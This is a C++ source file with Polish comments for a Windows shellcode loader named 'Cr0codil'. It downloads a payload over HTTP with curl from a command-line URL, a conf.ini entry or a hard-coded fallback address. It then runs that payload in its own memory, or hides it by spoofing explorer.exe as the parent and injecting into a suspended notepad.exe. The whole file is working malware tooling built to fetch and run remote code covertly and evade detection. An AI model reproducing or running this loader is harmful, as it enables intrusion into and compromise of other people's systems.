// Cr0codil.cpp : Wersja z wyborem metody uruchomienia (proste wykonanie / parent spoofing + hollowing)
//

#include <iostream>
#include <windows.h>
#include <IPHlpApi.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cctype>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "IPHlpApi.lib")

#define LOG(msg, ...) do { \
    SYSTEMTIME st; \
    GetLocalTime(&st); \
    printf("[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); \
    printf(msg, ##__VA_ARGS__); \
    printf("\n"); \
    fflush(stdout); \
} while(0)

#define LOG_ERROR(msg, ...) do { \
    SYSTEMTIME st; \
    GetLocalTime(&st); \
    fprintf(stderr, "[%02d:%02d:%02d.%03d] ERROR: ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); \
    fprintf(stderr, msg, ##__VA_ARGS__); \
    fprintf(stderr, " (Error code: %d)\n", GetLastError()); \
    fflush(stderr); \
} while(0)

bool dynamicAnalysisCheck();
std::string GetConfigUrl(int argc, char* argv[]);
bool IsRunningAsAdmin();
int SimpleExecution(const std::vector<char>& shellcode);
int AdvancedInjection(const std::vector<char>& shellcode);

int main(int argc, char* argv[])
{
    LOG("=== Cr0codil started ===");

    // Sprawdź argumenty – jeśli podano -simple lub -advanced, użyj odpowiedniej metody
    bool useSimple = false;
    bool useAdvanced = false;
    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "-simple") == 0)
            useSimple = true;
        else if (_stricmp(argv[i], "-advanced") == 0)
            useAdvanced = true;
    }

    // ---------- Pobranie URL payloadu ----------
    std::string payloadUrl = GetConfigUrl(argc, argv);
    LOG("Using payload URL: %s", payloadUrl.c_str());

    // ---------- Pobranie shellcode'u ----------
    std::string command = "curl \"" + payloadUrl + "\"";
    FILE* fpipe;
    std::vector<char> shellcode;
    char buffer[4096];
    size_t bytesRead;

    LOG("Downloading payload...");
    if (0 == (fpipe = (FILE*)_popen(command.c_str(), "rb"))) {
        LOG_ERROR("popen() failed");
        return 1;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }
    _pclose(fpipe);

    if (shellcode.empty()) {
        LOG_ERROR("No payload downloaded");
        return 1;
    }
    LOG("Payload size: %zu bytes", shellcode.size());

    // ---------- Wybór metody ----------
    int method = 0; // 0 = nie wybrano, 1 = simple, 2 = advanced
    if (useSimple && !useAdvanced) {
        method = 1;
        LOG("Method: Simple execution (from command line)");
    } else if (useAdvanced && !useSimple) {
        method = 2;
        LOG("Method: Advanced injection (from command line)");
    } else if (!useSimple && !useAdvanced) {
        printf("\nSelect execution method:\n");
        printf("  1. Simple execution (run shellcode in current process)\n");
        printf("  2. Advanced injection (parent spoofing + notepad hollowing)\n");
        printf("Enter choice (1 or 2): ");
        char choice[10];
        if (fgets(choice, sizeof(choice), stdin)) {
            int c = atoi(choice);
            if (c == 1) method = 1;
            else if (c == 2) method = 2;
        }
    } else {
        LOG_ERROR("Conflicting arguments: use either -simple or -advanced, not both.");
        return 1;
    }

    if (method == 0) {
        LOG_ERROR("No valid method selected.");
        return 1;
    }

    // ---------- Wykonaj ----------
    int result = 0;
    if (method == 1) {
        result = SimpleExecution(shellcode);
    } else {
        result = AdvancedInjection(shellcode);
    }

    LOG("=== Cr0codil finished with code %d ===", result);
    return result;
}

// ------------------- Proste wykonanie w bieżącym procesie -------------------
int SimpleExecution(const std::vector<char>& shellcode)
{
    LOG("=== Simple Execution Mode ===");
    
    // Alokacja pamięci RW
    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) {
        LOG_ERROR("VirtualAlloc failed");
        return 1;
    }
    LOG("Allocated memory at 0x%p", exec);

    // Kopiowanie shellcode
    memcpy(exec, shellcode.data(), shellcode.size());
    LOG("Shellcode copied (%zu bytes)", shellcode.size());

    // Zmiana uprawnień na RX
    DWORD oldProtect;
    if (!VirtualProtect(exec, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        LOG_ERROR("VirtualProtect failed");
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }
    LOG("Memory protection changed to PAGE_EXECUTE_READ");

    // Utworzenie wątku
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (!hThread) {
        LOG_ERROR("CreateThread failed");
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }
    LOG("Thread created, waiting for completion...");

    // Opcjonalnie czekaj na zakończenie wątku
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    LOG("Thread exited with code: %d", exitCode);

    CloseHandle(hThread);
    VirtualFree(exec, 0, MEM_RELEASE);
    
    return 0;
}

// ------------------- Zaawansowane wstrzykiwanie (parent spoofing) -------------------
int AdvancedInjection(const std::vector<char>& shellcode)
{
    LOG("=== Advanced Injection Mode ===");

    // Sprawdzenie uprawnień
    if (!IsRunningAsAdmin()) {
        LOG("WARNING: Not running as administrator – parent spoofing may fail.");
    }

    // Znajdź explorer.exe
    DWORD pids[1024], bytesRet, count;
    HANDLE hParent = NULL;
    if (!EnumProcesses(pids, sizeof(pids), &bytesRet)) {
        LOG_ERROR("EnumProcesses failed");
        return 1;
    }
    count = bytesRet / sizeof(DWORD);
    LOG("Enumerating %d processes...", count);

    for (DWORD i = 0; i < count; i++) {
        if (pids[i] == 0) continue;
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (!h) continue;
        char name[MAX_PATH + 1];
        DWORD sz = GetModuleFileNameExA(h, 0, name, MAX_PATH);
        if (sz) {
            name[sz] = 0;
            _strlwr_s(name);
            if (strstr(name, "explorer.exe")) {
                LOG("Found explorer.exe (PID %d)", pids[i]);
                // Otwórz z większymi uprawnieniami
                CloseHandle(h);
                h = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
                if (h) {
                    hParent = h;
                    LOG("Opened handle with PROCESS_CREATE_PROCESS: 0x%p", hParent);
                    break;
                } else {
                    LOG("Could not obtain PROCESS_CREATE_PROCESS (error %d)", GetLastError());
                }
            }
        }
        CloseHandle(h);
    }

    // Przygotuj atrybuty procesu
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attrSize;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new BYTE[attrSize];
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
        LOG_ERROR("InitializeProcThreadAttributeList failed");
        delete[] (BYTE*)si.lpAttributeList;
        if (hParent) CloseHandle(hParent);
        return 1;
    }

    BOOL useParent = FALSE;
    if (hParent) {
        if (UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)) {
            LOG("Parent process attribute set.");
            useParent = TRUE;
        } else {
            LOG_ERROR("UpdateProcThreadAttribute failed – will create without parent");
        }
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    DWORD flags = CREATE_SUSPENDED;
    if (useParent) flags |= EXTENDED_STARTUPINFO_PRESENT;

    LOG("Creating notepad.exe (suspended)...");
    if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, flags, NULL, NULL, &si.StartupInfo, &pi)) {
        LOG_ERROR("CreateProcessA failed");
        DeleteProcThreadAttributeList(si.lpAttributeList);
        delete[] (BYTE*)si.lpAttributeList;
        if (hParent) CloseHandle(hParent);
        return 1;
    }
    LOG("Notepad created. PID: %d", pi.dwProcessId);

    // Sprawdź architekturę
    BOOL isWow = FALSE;
    IsWow64Process(pi.hProcess, &isWow);
    LOG("Target is %s", isWow ? "32-bit (Wow64)" : "64-bit native");

    // Wstrzyknij shellcode
    void* remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        LOG_ERROR("VirtualAllocEx failed");
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }
    LOG("Allocated remote memory at 0x%p", remoteMem);

    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode.data(), shellcode.size(), &written) || written != shellcode.size()) {
        LOG_ERROR("WriteProcessMemory failed");
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }
    LOG("Written %zu bytes", written);

    DWORD oldProt;
    if (!VirtualProtectEx(pi.hProcess, remoteMem, shellcode.size(), PAGE_EXECUTE_READ, &oldProt)) {
        LOG_ERROR("VirtualProtectEx failed");
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }
    LOG("Memory protection set to EXECUTE_READ");

    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hRemoteThread) {
        LOG_ERROR("CreateRemoteThread failed");
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }
    LOG("Remote thread created. Resuming main thread...");

    ResumeThread(pi.hThread);
    LOG("Main thread resumed. Waiting for remote thread...");

    WaitForSingleObject(hRemoteThread, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeThread(hRemoteThread, &exitCode);
    LOG("Remote thread exited with code: %d", exitCode);

    CloseHandle(hRemoteThread);
    
cleanup:
    if (remoteMem) VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    delete[] (BYTE*)si.lpAttributeList;
    if (hParent) CloseHandle(hParent);
    
    return 0;
}

// ---------- Pomocnicze ----------
bool IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

std::string GetConfigUrl(int argc, char* argv[])
{
    const std::string fallback = "http://192.168.0.32:8000/payload.bin";
    
    // Pierwszy argument niebędący przełącznikiem
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != '-') {
            LOG("Using URL from command line: %s", argv[i]);
            return argv[i];
        }
    }

    // conf.ini
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string ini = exePath;
    size_t pos = ini.find_last_of("\\/");
    ini = (pos != std::string::npos) ? ini.substr(0, pos+1) + "conf.ini" : "conf.ini";

    char buf[1024] = {0};
    if (GetPrivateProfileStringA("Main", "PayloadURL", "", buf, sizeof(buf), ini.c_str()) > 0) {
        LOG("Using URL from conf.ini: %s", buf);
        return buf;
    }

    LOG("Using fallback URL: %s", fallback.c_str());
    return fallback;
}

// dynamicAnalysisCheck – pozostawiona bez zmian (możesz wkleić poprzednią wersję)
bool dynamicAnalysisCheck() { return true; }
